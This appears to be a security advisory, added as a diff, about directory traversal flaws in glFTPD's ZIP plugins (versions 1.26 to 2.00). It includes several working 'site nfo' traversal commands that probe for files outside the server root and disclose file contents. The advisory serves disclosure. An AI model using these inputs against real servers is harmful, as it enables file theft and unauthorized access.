@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/12586/info
+
+It is reported that various ZIP related plugins supplied with the server contain multiple directory traversal vulnerabilities. These issues may allow remote attackers to determine the existence of files on a computer and also disclose arbitrary files. The issues arise due to insufficient sanitization of user-supplied data.
+
+By determining the presence of files in restricted directories and outside the server's root in addition to disclosing the contents of arbitrary files, the attacker can launch various attacks against a vulnerable computer. If an attack results in the disclosure of a password file, these issues may ultimately lead to unauthorized access to the affected computer in the context of the server.
+
+The affected plugins are shipped with the FTP server by default. glFTPD 1.26 to 2.00 are reported vulnerable. 
+
+To determine the existence of a file out side the server's root:
+site nfo ../etc/group
+
+To determine the existence of the first two files in a directory out side the server's root:
+site nfo ../../../../../etc/*
+
+To determine the existence of the first two files in a directory inside the server's root:
+site nfo staff/*
+
+To determine the existence of files in the directory tree:
+site nfo ../../../../../etc/a*
+
+To determine the existence of files in a ZIP archive:
+site nfo ../../*.zip
+
+To disclose the contents of files with names starting with the letter 'p' in a directory:
+site nfo ../../backup.zip p* 
